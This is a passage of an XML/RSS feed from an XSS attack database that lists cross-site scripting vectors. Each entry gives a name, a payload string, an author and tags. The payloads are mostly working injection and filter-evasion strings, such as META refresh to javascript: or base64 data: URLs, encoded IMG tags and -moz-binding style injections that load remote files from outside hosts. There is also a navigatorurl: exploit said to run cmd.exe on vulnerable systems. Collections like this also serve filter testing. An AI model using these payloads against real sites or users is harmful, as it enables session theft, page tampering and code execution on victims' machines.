tag and utilized the onload event to modify the DOM. Also this vector uses semicolons to obfuscate.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, JSON, obfuscated&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;thespanner.co.uk</description>      <pubDate>Fri, 03 Aug 07 08:29:47 -0400</pubDate>      <ddb:authorName>thespanner.co.uk</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This vector injects a new body tag and utilized the onload event to modify the DOM. Also this vector uses semicolons to obfuscate.</ddb:exploitDescription>      <ddb:exploitName>JSON based semicolon-onload vector</ddb:exploitName>      <ddb:exploitString>&lt;body onload=;a1={x:document};;;;;;;;;_=a1.x;_.write(1);;;;</ddb:exploitString>      <ddb:exploitTags>general, evil tags, JSON, obfuscated</ddb:exploitTags>    </item>    <item>      <title>LAYER</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1889</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;LAYER&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;LAYER SRC=&quot;http://ha.ckers.org/scriptlet.html&quot;&gt;&lt;/LAYER&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;Layer (Older Netscape only)&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 10:18:31 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>Layer (Older Netscape only)</ddb:exploitDescription>      <ddb:exploitName>LAYER</ddb:exploitName>      <ddb:exploitString>&lt;LAYER SRC=&quot;http://ha.ckers.org/scriptlet.html&quot;&gt;&lt;/LAYER&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags</ddb:exploitTags>    </item>    <item>      <title>List-style-image</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1887</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;List-style-image&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;STYLE&gt;li {list-style-image: url(&quot;javascript:alert('XSS')&quot;);}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;Fairly esoteric issue dealing with embedding images for bulleted lists. This will only work in the IE rendering engine because of the JavaScript directive. Not a particularly useful cross site scripting vector.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, internet explorer&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 10:18:11 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>Fairly esoteric issue dealing with embedding images for bulleted lists. This will only work in the IE rendering engine because of the JavaScript directive. Not a particularly useful cross site scripting vector.</ddb:exploitDescription>      <ddb:exploitName>List-style-image</ddb:exploitName>      <ddb:exploitString>&lt;STYLE&gt;li {list-style-image: url(&quot;javascript:alert('XSS')&quot;);}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS</ddb:exploitString>      <ddb:exploitTags>general, evil tags, internet explorer</ddb:exploitTags>    </item>    <item>      <title>Livescript</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1890</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Livescript&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;IMG SRC=&quot;livescript:[code]&quot;&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;Livescript (Older Netscape only)&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 10:18:42 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>Livescript (Older Netscape only)</ddb:exploitDescription>      <ddb:exploitName>Livescript</ddb:exploitName>      <ddb:exploitString>&lt;IMG SRC=&quot;livescript:[code]&quot;&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags</ddb:exploitTags>    </item>    <item>      <title>Local .htc file</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1919</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Local .htc file&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;XSS STYLE=&quot;behavior: url(http://ha.ckers.org/xss.htc);&quot;&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This uses an .htc file which must be on the same server as the XSS vector. The example file works by pulling in the JavaScript and running it as part of the style attribute.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, internet explorer, injection&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 11:01:49 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This uses an .htc file which must be on the same server as the XSS vector. The example file works by pulling in the JavaScript and running it as part of the style attribute.</ddb:exploitDescription>      <ddb:exploitName>Local .htc file</ddb:exploitName>      <ddb:exploitString>&lt;XSS STYLE=&quot;behavior: url(http://ha.ckers.org/xss.htc);&quot;&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags, internet explorer, injection</ddb:exploitTags>    </item>    <item>      <title>Long UTF-8 Unicode w/out Semicolons</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1930</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Long UTF-8 Unicode w/out Semicolons&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;Long UTF-8 Unicode encoding without semicolons (this is often effective in XSS that attempts to look for ”&amp;#XX;”, since most people don't know about padding - up to 7 numeric characters total).  This is also useful against people who decode against strings like $tmp_string =~ s/.*\&amp;#(\d+);.*/$1/; which incorrectly assumes a semicolon is required to terminate an html encoded string (I've seen this in the wild).&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, obfuscated, internet explorer&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 11:02:18 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>Long UTF-8 Unicode encoding without semicolons (this is often effective in XSS that attempts to look for ”&amp;#XX;”, since most people don't know about padding - up to 7 numeric characters total).  This is also useful against people who decode against strings like $tmp_string =~ s/.*\&amp;#(\d+);.*/$1/; which incorrectly assumes a semicolon is required to terminate an html encoded string (I've seen this in the wild).</ddb:exploitDescription>      <ddb:exploitName>Long UTF-8 Unicode w/out Semicolons</ddb:exploitName>      <ddb:exploitString>&lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags, obfuscated, internet explorer</ddb:exploitTags>    </item>    <item>      <title>Malformed IMG Tags</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1952</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Malformed IMG Tags&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;Originally found by Begeek (http://www.begeek.it/2006/03/18/esclusivo-vulnerabilita-xss-in-firefox/#more-300 - cleaned up and shortened to work in all browsers), this XSS vector uses the relaxed rendering engine to create our XSS vector within an IMG tag that should be encapsulated within quotes.  I assume this was originally meant to correct sloppy coding.  This would make it significantly more difficult to correctly parse apart an HTML tag.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, obfuscated&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 11:14:38 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>Originally found by Begeek (http://www.begeek.it/2006/03/18/esclusivo-vulnerabilita-xss-in-firefox/#more-300 - cleaned up and shortened to work in all browsers), this XSS vector uses the relaxed rendering engine to create our XSS vector within an IMG tag that should be encapsulated within quotes.  I assume this was originally meant to correct sloppy coding.  This would make it significantly more difficult to correctly parse apart an HTML tag.</ddb:exploitDescription>      <ddb:exploitName>Malformed IMG Tags</ddb:exploitName>      <ddb:exploitString>&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags, obfuscated</ddb:exploitTags>    </item>    <item>      <title>Markup breaker with special quotes</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1831</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Markup breaker with special quotes&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;%26%2339);x=alert;x(%26%2340 /finally through!/.source %26%2341);//&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This markup breaking vector utilizes specially crafted quotes to break the existing markup. &lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, html breaking, JS breaking&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;kishor</description>      <pubDate>Sun, 22 Jul 07 09:37:46 -0400</pubDate>      <ddb:authorName>kishor</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This markup breaking vector utilizes specially crafted quotes to break the existing markup. </ddb:exploitDescription>      <ddb:exploitName>Markup breaker with special quotes</ddb:exploitName>      <ddb:exploitString>%26%2339);x=alert;x(%26%2340 /finally through!/.source %26%2341);//</ddb:exploitString>      <ddb:exploitTags>general, html breaking, JS breaking</ddb:exploitTags>    </item>    <item>      <title>META</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1892</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;META&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=javascript:alert('XSS');&quot;&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;The odd thing about meta refresh is that it doesn't send a referrer in the header - so it can be used for certain types of attacks where you need to get rid of referring URLs.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 10:19:53 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>The odd thing about meta refresh is that it doesn't send a referrer in the header - so it can be used for certain types of attacks where you need to get rid of referring URLs.</ddb:exploitDescription>      <ddb:exploitName>META</ddb:exploitName>      <ddb:exploitString>&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=javascript:alert('XSS');&quot;&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags</ddb:exploitTags>    </item>    <item>      <title>META w/additional URL parameter</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1894</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;META w/additional URL parameter&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0; URL=http://;URL=javascript:alert('XSS');&quot;&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;Meta with additional URL parameter. If the target website attempts to see if the URL contains an ”http://” you can evade it with the following technique (Submitted by Moritz Naumann http://www.moritz-naumann.com)&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 10:20:13 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>Meta with additional URL parameter. If the target website attempts to see if the URL contains an ”http://” you can evade it with the following technique (Submitted by Moritz Naumann http://www.moritz-naumann.com)</ddb:exploitDescription>      <ddb:exploitName>META w/additional URL parameter</ddb:exploitName>      <ddb:exploitString>&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0; URL=http://;URL=javascript:alert('XSS');&quot;&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags</ddb:exploitTags>    </item>    <item>      <title>META w/data:URL</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1893</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;META w/data:URL&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=data:text/html;base64###PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K&quot;&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This is nice because it also doesn't have anything visibly that has the word SCRIPT or the JavaScript directive in it, since it utilizes base64 encoding. Please see http://www.ietf.org/rfc/rfc2397.txt for more details&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 10:20:03 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This is nice because it also doesn't have anything visibly that has the word SCRIPT or the JavaScript directive in it, since it utilizes base64 encoding. Please see http://www.ietf.org/rfc/rfc2397.txt for more details</ddb:exploitDescription>      <ddb:exploitName>META w/data:URL</ddb:exploitName>      <ddb:exploitString>&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=data:text/html;base64###PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K&quot;&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags</ddb:exploitTags>    </item>    <item>      <title>Mixed Encoding</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1969</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Mixed Encoding&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;A HREF=&quot;http://6&amp;#09;6.000146.0x7.147/&quot;&gt;XSS&lt;/A&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;URL string evasion (assuming ”http://www.google.com/” is programmatically disallowed).&lt;br&gt;The tabs and newlines only work if this is encapsulated with quotes.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, obfuscated&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 10:20:48 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>URL string evasion (assuming ”http://www.google.com/” is programmatically disallowed).&#13;&#10;The tabs and newlines only work if this is encapsulated with quotes.</ddb:exploitDescription>      <ddb:exploitName>Mixed Encoding</ddb:exploitName>      <ddb:exploitString>&lt;A HREF=&quot;http://6&amp;#09;6.000146.0x7.147/&quot;&gt;XSS&lt;/A&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags, obfuscated</ddb:exploitTags>    </item>    <item>      <title>Mocha</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1895</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Mocha&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;IMG SRC=&quot;mocha:[code]&quot;&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;Mocha (Older Netscape only)&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 10:22:18 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>Mocha (Older Netscape only)</ddb:exploitDescription>      <ddb:exploitName>Mocha</ddb:exploitName>      <ddb:exploitString>&lt;IMG SRC=&quot;mocha:[code]&quot;&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags</ddb:exploitTags>    </item>    <item>      <title>Mozilla -moz-binding-url injection</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1833</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Mozilla -moz-binding-url injection&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt; style=-moz-binding:url(http://h4k.in/mozxss.xml#xss);&quot; a=&quot;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;The vector incudes a binding file via injected style attrbute. Gecko only.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, injection, gecko, style injection, XBL&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;.mario</description>      <pubDate>Mon, 26 Nov 07 08:41:29 -0500</pubDate>      <ddb:authorName>.mario</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>The vector incudes a binding file via injected style attrbute. Gecko only.</ddb:exploitDescription>      <ddb:exploitName>Mozilla -moz-binding-url injection</ddb:exploitName>      <ddb:exploitString> style=-moz-binding:url(http://h4k.in/mozxss.xml#xss);&quot; a=&quot;</ddb:exploitString>      <ddb:exploitTags>general, injection, gecko, style injection, XBL</ddb:exploitTags>    </item>    <item>      <title>Mozilla -moz-binding-url injection - filter evading</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1832</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Mozilla -moz-binding-url injection - filter evading&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt; sstyle=foobar&quot;tstyle=&quot;foobar&quot;ystyle=&quot;foobar&quot;lstyle=&quot;foobar&quot;estyle=&quot;foobar&quot;=-moz-binding:url(http://h4k.in/mozxss.xml#xss)&gt;foobar&lt;/b&gt;#xss)&quot; a=&quot;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This vector was once used on a major site to evade a stripping filter and inject binding XML.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, injection, gecko, style injection, XBL&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;PHPIDS Group</description>      <pubDate>Mon, 26 Nov 07 08:41:27 -0500</pubDate>      <ddb:authorName>PHPIDS Group</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This vector was once used on a major site to evade a stripping filter and inject binding XML.</ddb:exploitDescription>      <ddb:exploitName>Mozilla -moz-binding-url injection - filter evading</ddb:exploitName>      <ddb:exploitString> sstyle=foobar&quot;tstyle=&quot;foobar&quot;ystyle=&quot;foobar&quot;lstyle=&quot;foobar&quot;estyle=&quot;foobar&quot;=-moz-binding:url(http://h4k.in/mozxss.xml#xss)&gt;foobar&lt;/b&gt;#xss)&quot; a=&quot;</ddb:exploitString>      <ddb:exploitTags>general, injection, gecko, style injection, XBL</ddb:exploitTags>    </item>    <item>      <title>Multiline selfcontained XSS</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=2012</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Multiline selfcontained XSS&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;_&lt;br&gt;=&lt;br&gt;eval&lt;br&gt;b=1&lt;br&gt;__&lt;br&gt;=&lt;br&gt;location&lt;br&gt;c=1&lt;br&gt;_&lt;br&gt;(&lt;br&gt;__&lt;br&gt;.&lt;br&gt;hash&lt;br&gt;//&lt;br&gt;.&lt;br&gt;substr&lt;br&gt;(1)&lt;br&gt;)&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This vector uses line breaks to obfuscate and evaluates the location hash.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;self contained, general, obfuscated&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;.mario</description>      <pubDate>Mon, 23 Jul 07 19:02:35 -0400</pubDate>      <ddb:authorName>.mario</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This vector uses line breaks to obfuscate and evaluates the location hash.</ddb:exploitDescription>      <ddb:exploitName>Multiline selfcontained XSS</ddb:exploitName>      <ddb:exploitString>_&#13;&#10;=&#13;&#10;eval&#13;&#10;b=1&#13;&#10;__&#13;&#10;=&#13;&#10;location&#13;&#10;c=1&#13;&#10;_&#13;&#10;(&#13;&#10;__&#13;&#10;.&#13;&#10;hash&#13;&#10;//&#13;&#10;.&#13;&#10;substr&#13;&#10;(1)&#13;&#10;)</ddb:exploitString>      <ddb:exploitTags>self contained, general, obfuscated</ddb:exploitTags>    </item>    <item>      <title>Multiline w/Carriage Returns</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1941</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Multiline w/Carriage Returns&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;IMGSRC=&quot;javascript:alert('XSS')&quot;&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;Multiline Injected JavaScript using ASCII carriage returns (same as above only a more extreme example of this XSS vector).&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, internet explorer&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 10:25:59 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>Multiline Injected JavaScript using ASCII carriage returns (same as above only a more extreme example of this XSS vector).</ddb:exploitDescription>      <ddb:exploitName>Multiline w/Carriage Returns</ddb:exploitName>      <ddb:exploitString>&lt;IMGSRC=&quot;javascript:alert('XSS')&quot;&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags, internet explorer</ddb:exploitTags>    </item>    <item>      <title>Name contained XSS variant 1</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1843</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Name contained XSS variant 1&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;b=top,a=/loc/ . source,a+=/ation/ . source,b[a=a] = name&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This vector depends on attackers ability to access the window.name property where the payload is located.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, name contained, obfuscated&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;PHPIDS Group</description>      <pubDate>Sun, 22 Jul 07 09:37:46 -0400</pubDate>      <ddb:authorName>PHPIDS Group</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This vector depends on attackers ability to access the window.name property where the payload is located.</ddb:exploitDescription>      <ddb:exploitName>Name contained XSS variant 1</ddb:exploitName>      <ddb:exploitString>b=top,a=/loc/ . source,a+=/ation/ . source,b[a=a] = name</ddb:exploitString>      <ddb:exploitTags>general, name contained, obfuscated</ddb:exploitTags>    </item>    <item>      <title>Name contained XSS variant 2</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1842</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Name contained XSS variant 2&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;a=/ev/// &lt;br&gt;.source a+=/al/// &lt;br&gt;.source a[a] (name)&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This name contained XSS requires newlines to be able to work - and access to the window.name property.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, name contained, obfuscated&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;.mario</description>      <pubDate>Sun, 22 Jul 07 09:37:46 -0400</pubDate>      <ddb:authorName>.mario</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This name contained XSS requires newlines to be able to work - and access to the window.name property.</ddb:exploitDescription>      <ddb:exploitName>Name contained XSS variant 2</ddb:exploitName>      <ddb:exploitString>a=/ev/// &#13;&#13;.source a+=/al/// &#13;&#13;.source a[a] (name)</ddb:exploitString>      <ddb:exploitTags>general, name contained, obfuscated</ddb:exploitTags>    </item>    <item>      <title>Name contained XSS variant 3</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1841</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Name contained XSS variant 3&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;a=/ev/ &lt;br&gt;.source a+=/al/ &lt;br&gt;.source,a = a[a] a(name)&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;New-lined requiring name contained vector - this time not comment obfuscated so easier to detect.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, name contained&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;PHPIDS Group</description>      <pubDate>Sun, 22 Jul 07 09:37:46 -0400</pubDate>      <ddb:authorName>PHPIDS Group</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>New-lined requiring name contained vector - this time not comment obfuscated so easier to detect.</ddb:exploitDescription>      <ddb:exploitName>Name contained XSS variant 3</ddb:exploitName>      <ddb:exploitString>a=/ev/ &#13;&#13;.source a+=/al/ &#13;&#13;.source,a = a[a] a(name)</ddb:exploitString>      <ddb:exploitTags>general, name contained</ddb:exploitTags>    </item>    <item>      <title>Name contained XSS variant 4</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1840</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Name contained XSS variant 4&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;setTimeout// &lt;br&gt;(name// ,0)&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This vector utilizes the setTimeout function to fire - also it's name contained and comment-obfuscated and requires newlines.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, name contained, obfuscated, timed&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;PHPIDS Group</description>      <pubDate>Sun, 22 Jul 07 09:37:46 -0400</pubDate>      <ddb:authorName>PHPIDS Group</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This vector utilizes the setTimeout function to fire - also it's name contained and comment-obfuscated and requires newlines.</ddb:exploitDescription>      <ddb:exploitName>Name contained XSS variant 4</ddb:exploitName>      <ddb:exploitString>setTimeout// &#13;(name// ,0)</ddb:exploitString>      <ddb:exploitTags>general, name contained, obfuscated, timed</ddb:exploitTags>    </item>    <item>      <title>navigatorurl: code execution</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=2015</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;navigatorurl: code execution&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;navigatorurl:test&quot; -chrome &quot;javascript:C=Components.classes;I=Components.interfaces;file=C[\'@mozilla.org/file/local;1\'].createInstance(I.nsILocalFile);file.initWithPath(\'C:\'+String.fromCharCode(92)+String.fromCharCode(92)+\'Windows\'+String.fromCharCode(92)+String.fromCharCode(92)+\'System32\'+String.fromCharCode(92)+String.fromCharCode(92)+\'cmd.exe\');process=C[\'@mozilla.org/process/util;1\'].createInstance(I.nsIProcess);process.init(file);process.run(true%252c{}%252c0);alert(process)&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This navigatorurl-uri executes the cmd.exe on vulnerable systems.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;URI exploits, gecko, injection, general&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;xs-sniper</description>      <pubDate>Tue, 24 Jul 07 10:36:51 -0400</pubDate>      <ddb:authorName>xs-sniper</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This 